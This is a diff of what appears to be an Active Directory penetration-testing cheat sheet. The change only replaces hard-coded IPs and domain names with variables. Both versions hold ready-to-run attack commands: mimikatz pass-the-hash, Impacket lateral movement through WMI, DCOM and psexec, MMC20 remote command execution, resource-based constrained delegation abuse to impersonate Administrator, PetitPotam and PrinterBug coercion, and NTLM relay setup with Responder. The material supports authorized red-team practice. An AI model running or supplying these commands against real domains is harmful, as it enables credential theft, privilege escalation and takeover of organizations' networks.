@@ -38,7 +38,7 @@ klist                          # verify the ticket loaded
 Convert an NTLM hash into a Kerberos TGT. Useful when you have a hash and the target enforces Kerberos (NTLMv2 blocked or SMB signing required).
 
 ```powershell
-mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe
+mimikatz # sekurlsa::pth /user:Administrator /domain:$DOMAIN /ntlm:<hash> /run:cmd.exe
 ```
 
 Spawns a new `cmd.exe` with the injected Kerberos identity. Use `klist` in that process to confirm.
@@ -63,8 +63,8 @@ export KRB5CCNAME=/tmp/krb5cc_<uid>
 klist
 
 # Use directly with Impacket tools
-impacket-wmiexec -k -no-pass Administrator@dc.corp.local
-nxc smb 10.10.10.10 -k --use-kcache
+impacket-wmiexec -k -no-pass Administrator@$DC_IP
+nxc smb $IP -k --use-kcache
 ```
 
 ---
@@ -74,13 +74,13 @@ nxc smb 10.10.10.10 -k --use-kcache
 Distributed COM execution, less signatured than PsExec on some EDR platforms.
 
 ```bash
-impacket-dcomexec CORP/Administrator:'Password1'@10.10.10.10
+impacket-dcomexec $NETBIOS/Administrator:'Password1'@$IP
 ```
 
 From PowerShell (no external tools required):
 
 ```powershell
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","$IP"))
 $com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\Temp\out.txt","7")
 ```
 
@@ -100,26 +100,26 @@ If you can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on 
 Most domains allow any authenticated user to create up to 10 computer accounts (`ms-DS-MachineAccountQuota` default).
 
 ```bash
-impacket-addcomputer example.com/<user>:'<pass>' -computer-name 'ATTACKER$' -computer-pass 'ComputerP@ss1' -dc-ip 10.10.10.10
+impacket-addcomputer $DOMAIN/<user>:'<pass>' -computer-name 'ATTACKER$' -computer-pass 'ComputerP@ss1' -dc-ip $DC_IP
 ```
 
 ### Set RBCD on the victim
 
 ```bash
-impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write example.com/<user>:'<pass>' -dc-ip 10.10.10.10
+impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to 'VICTIM$' -action write $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP
 ```
 
 ### Abuse via S4U2Self + S4U2Proxy
 
 ```bash
-impacket-getST -spn cifs/victim.example.com -impersonate Administrator -dc-ip 10.10.10.10 example.com/'ATTACKER$':'ComputerP@ss1'
+impacket-getST -spn cifs/victim.$DOMAIN -impersonate Administrator -dc-ip $DC_IP $DOMAIN/'ATTACKER$':'ComputerP@ss1'
 ```
 
 That drops `Administrator.ccache`. Use it:
 
 ```bash
 export KRB5CCNAME=Administrator.ccache
-impacket-psexec -k -no-pass victim.example.com
+impacket-psexec -k -no-pass victim.$DOMAIN
 ```
 
 ---
@@ -136,9 +136,9 @@ Get-DomainComputer -Unconstrained | Select-Object dnshostname
 Coerce the DC with PetitPotam / PrinterBug:
 
 ```bash
-impacket-petitpotam <unconstrained-host> 10.10.10.10     # DC authenticates to your host
+impacket-petitpotam <unconstrained-host> $DC_IP     # DC authenticates to your host
 # Or via printnightmare
-dementor.py -d example.com -u <user> -p '<pass>' <unconstrained-host> 10.10.10.10
+dementor.py -d $DOMAIN -u <user> -p '<pass>' <unconstrained-host> $DC_IP
 ```
 
 On the unconstrained host, extract the DC's TGT:
@@ -158,7 +158,7 @@ If you capture NTLMv2 hashes via Responder and SMB signing is disabled on target
 
 ```bash
 # Check which targets have SMB signing disabled
-nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
+nxc smb $SUBNET --gen-relay-list targets.txt
 
 # Disable SMB in Responder so ntlmrelayx handles it
 sudo responder -I tun0 -wrf --disable-smb
